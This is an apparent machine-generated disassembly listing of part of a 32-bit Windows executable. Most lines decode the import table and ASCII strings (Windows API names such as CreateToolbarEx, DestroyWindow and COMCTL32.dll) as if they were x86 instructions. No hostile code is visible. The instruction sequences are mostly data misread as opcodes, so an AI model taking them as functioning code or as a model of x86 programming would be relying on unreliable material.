  425443:	push   esi
  425444:	push   eax
  425445:	fs pop eax
  425447:	ins    DWORD PTR es:[edi],dx
  425448:	push   0x56637a49
  42544d:	inc    ebp
  42544e:	dec    esi
  42544f:	push   ecx
  425450:	ins    DWORD PTR es:[edi],dx
  425451:	inc    ecx
  425452:	push   0x61
  425454:	dec    edx
  425455:	data16 ins BYTE PTR es:[edi],dx
  425457:	jne    0x4254bb
  425459:	imul   ecx,DWORD PTR [edx+0x46],0x75646348
  425460:	jno    0x4254cc
  425462:	arpl   WORD PTR [edx+0x7a],sp
  425465:	dec    ebp
  425466:	dec    edi
  425467:	push   ecx
  425468:	imul   edx,DWORD PTR [ebp+edx*2+0x6f],0x4b62554b
  425470:	push   edi
  425471:	imul   eax,DWORD PTR [edi+0x7a],0x5a71646b
  425478:	imul   eax,DWORD PTR [ecx+0x41],0x54434d58
  42547f:	dec    ebx
  425480:	js     0x4254f0
  425482:	pop    edx
  425483:	popa   
  425484:	push   ebx
  425485:	jbe    0x4254e9
  425487:	dec    ecx
  425488:	jns    0x4254e2
  42548a:	ins    DWORD PTR es:[edi],dx
  42548b:	pop    ecx
  42548c:	inc    edi
  42548d:	dec    ecx
  42548e:	outs   dx,BYTE PTR ds:[esi]
  42548f:	inc    ebp
  425490:	add    BYTE PTR [eax],al
  425492:	add    BYTE PTR [eax],al
  425494:	and    eax,0x4d213c
  425499:	add    BYTE PTR [eax],al
  42549b:	add    dl,al
  42549d:	push   esp
  42549e:	add    al,BYTE PTR [eax]
  4254a0:	add    DWORD PTR [eax],eax
  4254a2:	add    BYTE PTR [eax],al
  4254a4:	add    DWORD PTR [eax],eax
  4254a6:	add    BYTE PTR [eax],al
  4254a8:	add    DWORD PTR [eax],eax
  4254aa:	add    BYTE PTR [eax],al
  4254ac:	mov    eax,0xbc000254
  4254b1:	push   esp
  4254b2:	add    al,BYTE PTR [eax]
  4254b4:	rcl    BYTE PTR [edx+eax*1+0x0],0x4e
  4254b9:	dec    esi
  4254ba:	add    DWORD PTR [eax],eax
  4254bc:	rcl    DWORD PTR [edx+eax*1+0x0],cl
  4254c0:	add    BYTE PTR [eax],al
  4254c2:	addr16 je 0x42553e
  4254c5:	ins    BYTE PTR es:[edi],dx
  4254c6:	bound  esp,QWORD PTR [edi+0x6b]
  4254c9:	popa   
  4254ca:	push   0x68
  4254cc:	jns    0x425503
  4254ce:	cs je  0x42553a
  4254d1:	jo     0x4254d3
  4254d3:	aas    
  4254d4:	inc    ecx
  4254d5:	jo     0x425547
  4254d7:	dec    esi
  4254d8:	popa   
  4254d9:	ins    DWORD PTR es:[edi],dx
  4254da:	gs inc ebp
  4254dc:	js     0x425535
  4254de:	inc    eax
  4254df:	inc    eax
  4254e0:	pop    ecx
  4254e1:	inc    edi
  4254e2:	push   eax
  4254e3:	inc    ecx
  4254e4:	inc    edi
  4254e5:	push   eax
  4254e6:	inc    ecx
  4254e7:	dec    ebp
  4254e8:	push   eax
  4254e9:	inc    ecx
  4254ea:	inc    esi
  4254eb:	push   eax
  4254ec:	inc    ecx
  4254ed:	dec    ebp
  4254ee:	dec    ecx
  4254ef:	cmp    al,0x56
	...
  4254fd:	add    BYTE PTR [eax],al
  4254ff:	add    BYTE PTR [eax+0x55],bh
  425502:	add    al,BYTE PTR [eax]
	...
  42550c:	cld    
  42550d:	pop    ecx
  42550e:	add    al,BYTE PTR [eax]
  425510:	add    BYTE PTR [eax+0x2],dl
  425513:	add    BYTE PTR [ebp+edx*2+0x2],dl
  42551a:	add    BYTE PTR [eax],al
  42551c:	add    BYTE PTR [eax],al
  42551e:	add    BYTE PTR [eax],al
  425520:	add    BYTE PTR [ecx+0x2],ah
  425523:	add    BYTE PTR [eax+edx*2],bl
  425526:	add    al,BYTE PTR [eax]
  425528:	inc    esp
  425529:	push   edi
  42552a:	add    al,BYTE PTR [eax]
	...
  425534:	call   0x251:0xcc000264
  42553b:	add    BYTE PTR [eax],dl
  42553d:	pop    eax
  42553e:	add    al,BYTE PTR [eax]
	...
  425548:	mov    fs,WORD PTR [esi+0x2]
  42554b:	add    BYTE PTR [eax-0x3bfffdae],bl
  425551:	pop    eax
  425552:	add    al,BYTE PTR [eax]
	...
  42555c:	dec    eax
  42555d:	imul   eax,DWORD PTR [edx],0x2534c00
	...
  425577:	add    BYTE PTR [eax+0x59],bh
  42557a:	add    al,BYTE PTR [eax]
  42557c:	nop
  42557d:	pop    ecx
  42557e:	add    al,BYTE PTR [eax]
  425580:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425581:	pop    ecx
  425582:	add    al,BYTE PTR [eax]
  425584:	mov    dh,0x59
  425586:	add    al,BYTE PTR [eax]
  425588:	retf   0x259
  42558b:	add    al,ah
  42558d:	pop    ecx
  42558e:	add    al,BYTE PTR [eax]
  425590:	add    BYTE PTR [eax],al
  425592:	add    BYTE PTR [eax],al
  425594:	or     bl,BYTE PTR [edx+0x2]
  425597:	add    BYTE PTR [eax],bl
  425599:	pop    edx
  42559a:	add    al,BYTE PTR [eax]
  42559c:	and    al,0x5a
  42559e:	add    al,BYTE PTR [eax]
  4255a0:	xor    bl,BYTE PTR [edx+0x2]
  4255a3:	add    BYTE PTR [esi],bh
  4255a5:	pop    edx
  4255a6:	add    al,BYTE PTR [eax]
  4255a8:	dec    esp
  4255a9:	pop    edx
  4255aa:	add    al,BYTE PTR [eax]
  4255ac:	pop    esi
  4255ad:	pop    edx
  4255ae:	add    al,BYTE PTR [eax]
  4255b0:	outs   dx,BYTE PTR ds:[esi]
  4255b1:	pop    edx
  4255b2:	add    al,BYTE PTR [eax]
  4255b4:	sbb    BYTE PTR [edx+0x2],0x0
  4255b8:	mov    WORD PTR [edx+0x2],ds
  4255bb:	add    BYTE PTR [eax-0x55fffda6],bl
  4255c1:	pop    edx
  4255c2:	add    al,BYTE PTR [eax]
  4255c4:	mov    dh,0x5a
  4255c6:	add    al,BYTE PTR [eax]
  4255c8:	retf   0x25a
  4255cb:	add    dl,bl
  4255cd:	pop    edx
  4255ce:	add    al,BYTE PTR [eax]
  4255d0:	call   0xf642582f
  4255d5:	pop    edx
  4255d6:	add    al,BYTE PTR [eax]
  4255d8:	add    bl,BYTE PTR [ebx+0x2]
  4255db:	add    BYTE PTR [eax],dl
  4255dd:	pop    ebx
  4255de:	add    al,BYTE PTR [eax]
  4255e0:	push   ds
  4255e1:	pop    ebx
  4255e2:	add    al,BYTE PTR [eax]
  4255e4:	sub    bl,BYTE PTR [ebx+0x2]
  4255e7:	add    BYTE PTR [edx],bh
  4255e9:	pop    ebx
  4255ea:	add    al,BYTE PTR [eax]
  4255ec:	dec    eax
  4255ed:	pop    ebx
  4255ee:	add    al,BYTE PTR [eax]
  4255f0:	push   esp
  4255f1:	pop    ebx
  4255f2:	add    al,BYTE PTR [eax]
  4255f4:	pusha  
  4255f5:	pop    ebx
  4255f6:	add    al,BYTE PTR [eax]
  4255f8:	jo     0x425655
  4255fa:	add    al,BYTE PTR [eax]
  4255fc:	sbb    BYTE PTR [ebx+0x2],0x0
  425600:	xchg   edx,eax
  425601:	pop    ebx
  425602:	add    al,BYTE PTR [eax]
  425604:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425605:	pop    ebx
  425606:	add    al,BYTE PTR [eax]
  425608:	mov    eax,0xc800025b
  42560d:	pop    ebx
  42560e:	add    al,BYTE PTR [eax]
  425610:	aam    0x5b
  425612:	add    al,BYTE PTR [eax]
  425614:	out    0x5b,al
  425616:	add    al,BYTE PTR [eax]
  425618:	repnz pop ebx
  42561a:	add    al,BYTE PTR [eax]
  42561c:	(bad)  
  42561d:	pop    ebx
  42561e:	add    al,BYTE PTR [eax]
  425620:	push   cs
  425621:	pop    esp
  425622:	add    al,BYTE PTR [eax]
  425624:	sbb    al,0x5c
  425626:	add    al,BYTE PTR [eax]
  425628:	cs pop esp
  42562a:	add    al,BYTE PTR [eax]
  42562c:	ds pop esp
  42562e:	add    al,BYTE PTR [eax]
  425630:	dec    esi
  425631:	pop    esp
  425632:	add    al,BYTE PTR [eax]
  425634:	pusha  
  425635:	pop    esp
  425636:	add    al,BYTE PTR [eax]
  425638:	ins    BYTE PTR es:[edi],dx
  425639:	pop    esp
  42563a:	add    al,BYTE PTR [eax]
  42563c:	xchg   BYTE PTR [edx+eax*1+0x0],bl
  425640:	xchg   esi,eax
  425641:	pop    esp
  425642:	add    al,BYTE PTR [eax]
  425644:	scas   al,BYTE PTR es:[edi]
  425645:	pop    esp
  425646:	add    al,BYTE PTR [eax]
  425648:	ret    0x25c
  42564b:	add    al,dl
  42564d:	pop    esp
  42564e:	add    al,BYTE PTR [eax]
  425650:	loop   0x4256ae
  425652:	add    al,BYTE PTR [eax]
  425654:	neg    BYTE PTR [edx+eax*1+0x0]
  425658:	or     bl,BYTE PTR [ebp+0x2]
  42565b:	add    BYTE PTR [ebx*2+0x5d2a0002],bl
  425662:	add    al,BYTE PTR [eax]
  425664:	cmp    al,0x5d
  425666:	add    al,BYTE PTR [eax]
  425668:	dec    edx
  425669:	pop    ebp
  42566a:	add    al,BYTE PTR [eax]
  42566c:	pop    edx
  42566d:	pop    ebp
  42566e:	add    al,BYTE PTR [eax]
  425670:	outs   dx,BYTE PTR ds:[esi]
  425671:	pop    ebp
  425672:	add    al,BYTE PTR [eax]
  425674:	test   BYTE PTR [ebp+0x2],bl
  425677:	add    BYTE PTR [esi-0x5bfffda3],dl
  42567d:	pop    ebp
  42567e:	add    al,BYTE PTR [eax]
  425680:	mov    ah,0x5d
  425682:	add    al,BYTE PTR [eax]
  425684:	ret    0x25d
  425687:	add    al,ah
  425689:	pop    ebp
  42568a:	add    al,BYTE PTR [eax]
  42568c:	out    dx,al
  42568d:	pop    ebp
  42568e:	add    al,BYTE PTR [eax]
  425690:	cli    
  425691:	pop    ebp
  425692:	add    al,BYTE PTR [eax]
  425694:	or     al,0x5e
  425696:	add    al,BYTE PTR [eax]
  425698:	sbb    bl,BYTE PTR [esi+0x2]
  42569b:	add    BYTE PTR [esi],ah
  42569d:	pop    esi
  42569e:	add    al,BYTE PTR [eax]
  4256a0:	ds pop esi
  4256a2:	add    al,BYTE PTR [eax]
  4256a4:	dec    esi
  4256a5:	pop    esi
  4256a6:	add    al,BYTE PTR [eax]
  4256a8:	pop    edx
  4256a9:	pop    esi
  4256aa:	add    al,BYTE PTR [eax]
  4256ac:	push   0x5e
  4256ae:	add    al,BYTE PTR [eax]
  4256b0:	test   BYTE PTR [esi+0x2],bl
  4256b3:	add    BYTE PTR [edx-0x57fffda2],bl
  4256b9:	pop    esi
  4256ba:	add    al,BYTE PTR [eax]
  4256bc:	mov    edx,0xd200025e
  4256c1:	pop    esi
  4256c2:	add    al,BYTE PTR [eax]
  4256c4:	loop   0x425724
  4256c6:	add    al,BYTE PTR [eax]
  4256c8:	lock pop esi
  4256ca:	add    al,BYTE PTR [eax]
  4256cc:	or     bl,BYTE PTR [edi+0x2]
  4256cf:	add    BYTE PTR [edx],bl
  4256d1:	pop    edi
  4256d2:	add    al,BYTE PTR [eax]
  4256d4:	cs pop edi
  4256d6:	add    al,BYTE PTR [eax]
  4256d8:	cmp    bl,BYTE PTR [edi+0x2]
  4256db:	add    BYTE PTR [edx+0x5f],cl
  4256de:	add    al,BYTE PTR [eax]
  4256e0:	pop    edx
  4256e1:	pop    edi
  4256e2:	add    al,BYTE PTR [eax]
  4256e4:	push   0x5f
  4256e6:	add    al,BYTE PTR [eax]
  4256e8:	sbb    BYTE PTR [edi+0x2],0x0
  4256ec:	xchg   edx,eax
  4256ed:	pop    edi
  4256ee:	add    al,BYTE PTR [eax]
  4256f0:	test   al,0x5f
  4256f2:	add    al,BYTE PTR [eax]
  4256f4:	mov    ah,0x5f
  4256f6:	add    al,BYTE PTR [eax]
  4256f8:	les    ebx,FWORD PTR [edi+0x2]
  4256fb:	add    dl,dl
  4256fd:	pop    edi
  4256fe:	add    al,BYTE PTR [eax]
  425700:	loopne 0x425761
  425702:	add    al,BYTE PTR [eax]
  425704:	repnz pop edi
  425706:	add    al,BYTE PTR [eax]
  425708:	push   es
  425709:	pusha  
  42570a:	add    al,BYTE PTR [eax]
  42570c:	push   ss
  42570d:	pusha  
  42570e:	add    al,BYTE PTR [eax]
  425710:	sub    BYTE PTR [eax+0x2],ah
  425713:	add    BYTE PTR [eax+eiz*2],dh
  425716:	add    al,BYTE PTR [eax]
  425718:	inc    esp
  425719:	pusha  
  42571a:	add    al,BYTE PTR [eax]
  42571c:	push   esp
  42571d:	pusha  
  42571e:	add    al,BYTE PTR [eax]
  425720:	jo     0x425782
  425722:	add    al,BYTE PTR [eax]
  425724:	test   BYTE PTR [eax+0x2],ah
  425727:	add    BYTE PTR [edx-0x53fffda0],dl
  42572d:	pusha  
  42572e:	add    al,BYTE PTR [eax]
  425730:	mov    edx,0xce000260
  425735:	pusha  
  425736:	add    al,BYTE PTR [eax]
  425738:	fisub  WORD PTR [eax+0x2]
  42573b:	add    ah,ch
  42573d:	pusha  
  42573e:	add    al,BYTE PTR [eax]
  425740:	add    BYTE PTR [eax],al
  425742:	add    BYTE PTR [eax],al
  425744:	or     al,0x61
  425746:	add    al,BYTE PTR [eax]
  425748:	sbb    ah,BYTE PTR [ecx+0x2]
  42574b:	add    BYTE PTR [ecx+eiz*2],ch
  42574e:	add    al,BYTE PTR [eax]
  425750:	inc    eax
  425751:	popa   
  425752:	add    al,BYTE PTR [eax]
  425754:	push   edx
  425755:	popa   
  425756:	add    al,BYTE PTR [eax]
  425758:	pusha  
  425759:	popa   
  42575a:	add    al,BYTE PTR [eax]
  42575c:	js     0x4257bf
  42575e:	add    al,BYTE PTR [eax]
  425760:	nop
  425761:	popa   
  425762:	add    al,BYTE PTR [eax]
  425764:	mov    al,ds:0xb0000261
  425769:	popa   
  42576a:	add    al,BYTE PTR [eax]
  42576c:	ret    0x261
  42576f:	add    al,bl
  425771:	popa   
  425772:	add    al,BYTE PTR [eax]
  425774:	in     al,0x61
  425776:	add    al,BYTE PTR [eax]
  425778:	(bad)  
  425779:	popa   
  42577a:	add    al,BYTE PTR [eax]
  42577c:	sbb    ah,BYTE PTR [edx+0x2]
  42577f:	add    BYTE PTR [edx+eiz*2],ah
  425782:	add    al,BYTE PTR [eax]
  425784:	cmp    BYTE PTR [edx+0x2],ah
  425787:	add    BYTE PTR [esi+0x62],cl
  42578a:	add    al,BYTE PTR [eax]
  42578c:	pusha  
  42578d:	bound  eax,QWORD PTR [edx]
  42578f:	add    BYTE PTR [edx+eiz*2+0x2],dh
  425793:	add    BYTE PTR [edx-0x6bfffd9e],al
  425799:	bound  eax,QWORD PTR [edx]
  42579b:	add    BYTE PTR [eax-0x4bfffd9e],ch
  4257a1:	bound  eax,QWORD PTR [edx]
  4257a3:	add    dl,al
  4257a5:	bound  eax,QWORD PTR [edx]
  4257a7:	add    dl,dl
  4257a9:	bound  eax,QWORD PTR [edx]
  4257ab:	add    dl,ah
  4257ad:	bound  eax,QWORD PTR [edx]
  4257af:	add    al,bh
  4257b1:	bound  eax,QWORD PTR [edx]
  4257b3:	add    BYTE PTR [esi],al
  4257b5:	arpl   WORD PTR [edx],ax
  4257b7:	add    BYTE PTR [esi],dl
  4257b9:	arpl   WORD PTR [edx],ax
  4257bb:	add    BYTE PTR [eax],ch
  4257bd:	arpl   WORD PTR [edx],ax
  4257bf:	add    BYTE PTR [edx],bh
  4257c1:	arpl   WORD PTR [edx],ax
  4257c3:	add    BYTE PTR [esi+0x63],al
  4257c6:	add    al,BYTE PTR [eax]
  4257c8:	push   edx
  4257c9:	arpl   WORD PTR [edx],ax
  4257cb:	add    BYTE PTR [ebx+eiz*2+0x2],ah
  4257cf:	add    BYTE PTR [ebx+eiz*2+0x639a0002],al
  4257d6:	add    al,BYTE PTR [eax]
  4257d8:	mov    al,0x63
  4257da:	add    al,BYTE PTR [eax]
  4257dc:	les    esp,FWORD PTR [ebx+0x2]
  4257df:	add    dh,dl
  4257e1:	arpl   WORD PTR [edx],ax
  4257e3:	add    al,ch
  4257e5:	arpl   WORD PTR [edx],ax
  4257e7:	add    al,bh
  4257e9:	arpl   WORD PTR [edx],ax
  4257eb:	add    BYTE PTR [eax],cl
  4257ed:	add    al,BYTE PTR fs:[eax]
  4257f0:	sbb    BYTE PTR [edx+eax*1+0x0],ah
  4257f4:	sub    BYTE PTR [edx+eax*1+0x0],ah
  4257f8:	cmp    al,0x64
  4257fa:	add    al,BYTE PTR [eax]
  4257fc:	dec    edx
  4257fd:	add    al,BYTE PTR fs:[eax]
  425800:	push   0x78000264
  425805:	add    al,BYTE PTR fs:[eax]
  425808:	test   BYTE PTR [edx+eax*1+0x0],ah
  42580c:	add    BYTE PTR [eax],al
  42580e:	add    BYTE PTR [eax],al
  425810:	test   al,0x64
  425812:	add    al,BYTE PTR [eax]
  425814:	mov    dh,0x64
  425816:	add    al,BYTE PTR [eax]
  425818:	ret    0x264
  42581b:	add    dl,cl
  42581d:	add    al,BYTE PTR fs:[eax]
  425820:	aam    0x64
  425822:	add    al,BYTE PTR [eax]
  425824:	out    0x64,al
  425826:	add    al,BYTE PTR [eax]
  425828:	hlt    
  425829:	add    al,BYTE PTR fs:[eax]
  42582c:	(bad)  
  42582d:	add    al,BYTE PTR fs:[eax]
  425830:	or     BYTE PTR [ebp+0x2],ah
  425833:	add    BYTE PTR [edx],dl
  425835:	add    al,BYTE PTR gs:[eax]
  425838:	and    ah,BYTE PTR [ebp+0x2]
  42583b:	add    BYTE PTR [eax],dh
  42583d:	add    al,BYTE PTR gs:[eax]
  425840:	cmp    al,0x65
  425842:	add    al,BYTE PTR [eax]
  425844:	inc    esi
  425845:	add    al,BYTE PTR gs:[eax]
  425848:	push   esp
  425849:	add    al,BYTE PTR gs:[eax]
  42584c:	pop    esp
  42584d:	add    al,BYTE PTR gs:[eax]
  425850:	data16 add al,BYTE PTR gs:[eax]
  425854:	jo     0x4258bb
  425856:	add    al,BYTE PTR [eax]
  425858:	jl     0x4258bf
  42585a:	add    al,BYTE PTR [eax]
  42585c:	test   BYTE PTR [ebp+0x2],ah
  42585f:	add    BYTE PTR [edx-0x63fffd9b],dl
  425865:	add    al,BYTE PTR gs:[eax]
  425868:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425869:	add    al,BYTE PTR gs:[eax]
  42586c:	scas   al,BYTE PTR es:[edi]
  42586d:	add    al,BYTE PTR gs:[eax]
  425870:	mov    eax,0xc2000265
  425875:	add    al,BYTE PTR gs:[eax]
  425878:	int3   
  425879:	add    al,BYTE PTR gs:[eax]
  42587c:	aam    0x65
  42587e:	add    al,BYTE PTR [eax]
  425880:	call   0xf2425aea
  425885:	add    al,BYTE PTR gs:[eax]
  425888:	cld    
  425889:	add    al,BYTE PTR gs:[eax]
  42588c:	push   es
  42588d:	data16 add al,BYTE PTR [eax]
  425890:	push   cs
  425891:	data16 add al,BYTE PTR [eax]
  425894:	push   ss
  425895:	data16 add al,BYTE PTR [eax]
  425898:	and    BYTE PTR [esi+0x2],ah
  42589b:	add    BYTE PTR [edx],ch
  42589d:	data16 add al,BYTE PTR [eax]
  4258a0:	xor    al,0x66
  4258a2:	add    al,BYTE PTR [eax]
  4258a4:	inc    eax
  4258a5:	data16 add al,BYTE PTR [eax]
  4258a8:	dec    esp
  4258a9:	data16 add al,BYTE PTR [eax]
  4258ac:	push   esi
  4258ad:	data16 add al,BYTE PTR [eax]
  4258b0:	pop    esi
  4258b1:	data16 add al,BYTE PTR [eax]
  4258b4:	outs   dx,BYTE PTR ds:[esi]
  4258b5:	data16 add al,BYTE PTR [eax]
  4258b8:	js     0x425920
  4258ba:	add    al,BYTE PTR [eax]
  4258bc:	and    BYTE PTR [esi+0x2],0x0
  4258c0:	add    BYTE PTR [eax],al
  4258c2:	add    BYTE PTR [eax],al
  4258c4:	call   0x266:0xaa000266
  4258cb:	add    al,al
  4258cd:	data16 add al,BYTE PTR [eax]
  4258d0:	aam    0x66
  4258d2:	add    al,BYTE PTR [eax]
  4258d4:	loopne 0x42593c
  4258d6:	add    al,BYTE PTR [eax]
  4258d8:	lock data16 add al,BYTE PTR [eax]
  4258dc:	add    al,0x67
  4258de:	add    al,BYTE PTR [eax]
  4258e0:	sbb    ah,BYTE PTR [edi+0x2]
  4258e3:	add    BYTE PTR [edx],ch
  4258e5:	add    al,BYTE PTR [bx+si]
  4258e8:	xor    al,0x67
  4258ea:	add    al,BYTE PTR [eax]
  4258ec:	inc    esi
  4258ed:	add    al,BYTE PTR [bx+si]
  4258f0:	push   eax
  4258f1:	add    al,BYTE PTR [bx+si]
  4258f4:	data16 add al,BYTE PTR [bx+si]
  4258f8:	jb     0x425961
  4258fa:	add    al,BYTE PTR [eax]
  4258fc:	jl     0x425965
  4258fe:	add    al,BYTE PTR [eax]
  425900:	xchg   BYTE PTR [edi+0x2],ah
  425903:	add    BYTE PTR [eax-0x5bfffd99],bl
  425909:	add    al,BYTE PTR [bx+si]
  42590c:	mov    eax,0xc8000267
  425911:	add    al,BYTE PTR [bx+si]
  425914:	(bad)  
  425915:	add    al,BYTE PTR [bx+si]
  425918:	jmp    0x267:0xf6000267
  42591f:	add    BYTE PTR [edx],cl
  425921:	push   0x68140002
  425926:	add    al,BYTE PTR [eax]
  425928:	and    ch,BYTE PTR [eax+0x2]
  42592b:	add    BYTE PTR [eax+ebp*2],ch
  42592e:	add    al,BYTE PTR [eax]
  425930:	cmp    BYTE PTR [eax+0x2],ch
  425933:	add    BYTE PTR [eax+ebp*2+0x2],cl
  425937:	add    BYTE PTR [esi+0x68],dl
  42593a:	add    al,BYTE PTR [eax]
  42593c:	ins    BYTE PTR es:[edi],dx
  42593d:	push   0x68780002
  425942:	add    al,BYTE PTR [eax]
  425944:	mov    BYTE PTR [eax+0x2],ch
  425947:	add    BYTE PTR [edx-0x57fffd98],bl
  42594d:	push   0x68b80002
  425952:	add    al,BYTE PTR [eax]
  425954:	les    ebp,FWORD PTR [eax+0x2]
  425957:	add    al,dl
  425959:	push   0x68e40002
  42595e:	add    al,BYTE PTR [eax]
  425960:	out    dx,al
  425961:	push   0x69060002
  425966:	add    al,BYTE PTR [eax]
  425968:	push   ds
  425969:	imul   eax,DWORD PTR [edx],0x2692a00
  42596f:	add    BYTE PTR [edx],bh
  425971:	imul   eax,DWORD PTR [edx],0x0
  425977:	add    BYTE PTR [edi+0x0],dl
  42597a:	dec    ecx
  42597b:	outs   dx,BYTE PTR ds:[esi]
  42597c:	imul   esi,DWORD PTR [ebx+eax*2+0x6f],0x6e6f6d6d
  425984:	inc    ebx
  425985:	outs   dx,DWORD PTR ds:[esi]
  425986:	outs   dx,BYTE PTR ds:[esi]
  425987:	je     0x4259fb
  425989:	outs   dx,DWORD PTR ds:[esi]
  42598a:	ins    BYTE PTR es:[edi],dx
  42598b:	jae    0x4259d2
  42598d:	js     0x42598f
  42598f:	add    BYTE PTR [eax+eax*1+0x49],cl
  425993:	ins    DWORD PTR es:[edi],dx
  425994:	popa   
  425995:	addr16 gs dec esp
  425998:	imul   esi,DWORD PTR [ebx+0x74],0x6d65525f
  42599f:	outs   dx,DWORD PTR ds:[esi]
  4259a0:	jbe    0x425a07
  4259a2:	add    BYTE PTR [eax],al
  4259a4:	push   ss
  4259a5:	add    BYTE PTR [ebx+0x72],al
  4259a8:	gs popa 
  4259aa:	je     0x425a11
  4259ac:	push   esp
  4259ad:	outs   dx,DWORD PTR ds:[esi]
  4259ae:	outs   dx,DWORD PTR ds:[esi]
  4259af:	ins    BYTE PTR es:[edi],dx
  4259b0:	bound  esp,QWORD PTR [ecx+0x72]
  4259b3:	inc    ebp
  4259b4:	js     0x4259b6
  4259b6:	add    BYTE PTR ds:[ecx+0x6d],cl
  4259ba:	popa   
  4259bb:	addr16 gs dec esp
  4259be:	imul   esi,DWORD PTR [ebx+0x74],0x7465475f
  4259c5:	dec    ecx
  4259c6:	arpl   WORD PTR [edi+0x6e],bp
  4259c9:	add    BYTE PTR ds:0x65724300,dl
  4259cf:	popa   
  4259d0:	je     0x425a37
  4259d2:	push   ebx
  4259d3:	je     0x425a36
  4259d5:	je     0x425a4c
  4259d7:	jae    0x425a30
  4259d9:	imul   ebp,DWORD PTR [esi+0x64],0x57776f
  4259e0:	pop    ss
  4259e1:	add    BYTE PTR [ebp+eiz*2+0x73],al
  4259e5:	je     0x425a59
  4259e7:	outs   dx,DWORD PTR ds:[esi]
  4259e8:	jns    0x425a3a
  4259ea:	jb     0x425a5b
  4259ec:	jo     0x425a53
  4259ee:	jb     0x425a64
  4259f0:	jns    0x425a45
  4259f2:	push   0x50746565
  4259f7:	popa   
  4259f8:	add    BYTE PTR gs:[bx+si],al
  4259fc:	inc    ebx
  4259fd:	dec    edi
  4259fe:	dec    ebp
  4259ff:	inc    ebx
  425a00:	push   esp
  425a01:	dec    esp
  425a02:	xor    esi,DWORD PTR [edx]
  425a04:	cs fs ins BYTE PTR es:[edi],dx
  425a07:	ins    BYTE PTR es:[edi],dx
  425a08:	add    BYTE PTR [eax],al
  425a0a:	mov    cl,0x2
  425a0c:	push   esi
  425a0d:	imul   ecx,DWORD PTR [ebx+0x65],0x79
  425a11:	push   ebx
  425a12:	arpl   WORD PTR [ecx+0x6e],sp
  425a15:	push   edi
  425a16:	add    BYTE PTR [eax],al
  425a18:	push   ecx
  425a19:	add    dl,BYTE PTR [ebx+0x65]
  425a1c:	je     0x425a6e
  425a1e:	popa   
  425a1f:	jb     0x425a86
  425a21:	outs   dx,BYTE PTR ds:[esi]
  425a22:	je     0x425a24
  425a24:	sgdtd  [edi+0x65]
  425a28:	je     0x425a6e
  425a2a:	ins    BYTE PTR es:[edi],dx
  425a2b:	addr16 dec ecx
  425a2d:	je     0x425a94
  425a2f:	ins    DWORD PTR es:[edi],dx
  425a30:	add    BYTE PTR [eax],al
  425a32:	scas   eax,DWORD PTR es:[edi]
  425a33:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  425a37:	fs dec ecx
  425a39:	arpl   WORD PTR [edi+0x6e],bp
  425a3c:	inc    ecx
  425a3d:	add    BYTE PTR [ebx+0x2],bh
  425a40:	push   ebx
  425a41:	push   0x7543776f
  425a46:	jb     0x425abb
  425a48:	outs   dx,DWORD PTR ds:[esi]
  425a49:	jb     0x425a4b
  425a4b:	add    BYTE PTR ds:0x67655202,al
  425a51:	imul   esi,DWORD PTR [ebx+0x74],0x6c437265
  425a58:	popa   
  425a59:	jae    0x425ace
  425a5b:	push   edi
  425a5c:	add    BYTE PTR [eax],al
  425a5e:	xchg   esp,eax
  425a5f:	add    BYTE PTR [ebp+eiz*2+0x73],al
  425a63:	je     0x425ad7
  425a65:	outs   dx,DWORD PTR ds:[esi]
  425a66:	jns    0x425aab
  425a68:	popa   
  425a69:	jb     0x425ad0
  425a6b:	je     0x425a6d
  425a6d:	add    cl,bl
  425a6f:	add    DWORD PTR [ebp+0x6f],ecx
  425a72:	outs   dx,BYTE PTR ds:[esi]
  425a73:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x6d6f7246
  425a7b:	push   edx
  425a7c:	arpl   WORD PTR gs:[eax+eax*1-0x60],si
  425a81:	add    DWORD PTR [ecx+0x73],ecx
  425a84:	push   edi
  425a85:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  425a8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425a8d:	add    DWORD PTR [ecx+0x73],ecx
  425a90:	pop    edx
  425a91:	outs   dx,DWORD PTR ds:[esi]
  425a92:	outs   dx,DWORD PTR ds:[esi]
  425a93:	ins    DWORD PTR es:[edi],dx
  425a94:	gs add BYTE PTR fs:[eax],al
  425a98:	aaa    
  425a99:	add    BYTE PTR [ebx+0x68],al
  425a9c:	popa   
  425a9d:	jb     0x425af4
  425a9f:	jo     0x425b11
  425aa1:	gs jb  0x425ae6
  425aa4:	jne    0x425b0c
  425aa6:	inc    cx
  425aa8:	add    BYTE PTR [eax],al
  425aaa:	inc    ecx
  425aab:	add    dl,BYTE PTR [ebx+0x65]
  425aae:	je     0x425af6
  425ab0:	outs   dx,DWORD PTR ds:[esi]
  425ab1:	arpl   WORD PTR [ebp+0x73],si
  425ab4:	add    BYTE PTR [eax],al
  425ab6:	cwde   
  425ab7:	add    DWORD PTR [ecx+0x73],ecx
  425aba:	inc    esp
  425abb:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  425ac2:	jae    0x425b37
  425ac4:	popa   
  425ac5:	addr16 gs push edi
  425ac8:	add    BYTE PTR [eax],al
  425aca:	loop   0x425acc
  425acc:	inc    esi
  425acd:	imul   ebp,DWORD PTR [esi+0x64],0x646e6957
  425ad4:	outs   dx,DWORD PTR ds:[esi]
  425ad5:	ja     0x425b1c
  425ad7:	js     0x425b1a
  425ad9:	add    bl,bl
  425adb:	add    DWORD PTR [ebp+0x6f],ecx
  425ade:	jbe    0x425b45
  425ae0:	push   edi
  425ae1:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  425ae8:	mov    al,BYTE PTR [edx]
  425aea:	push   esp
  425aeb:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x6f646e69
  425af3:	ja     0x425b68
  425af5:	add    BYTE PTR [ebx+0x61724400],dh
  425afb:	ja     0x425b46
  425afd:	arpl   WORD PTR [edi+0x6e],bp
  425b00:	add    BYTE PTR [eax],al
  425b02:	xchg   edi,eax
  425b03:	add    BYTE PTR [ebp+eiz*2+0x73],al
  425b07:	je     0x425b7b
  425b09:	outs   dx,DWORD PTR ds:[esi]
  425b0a:	jns    0x425b59
  425b0c:	outs   dx,BYTE PTR gs:[esi]
  425b0e:	jne    0x425b10
  425b10:	sbb    BYTE PTR [ecx],al
  425b12:	inc    edi
  425b13:	gs je  0x425b5f
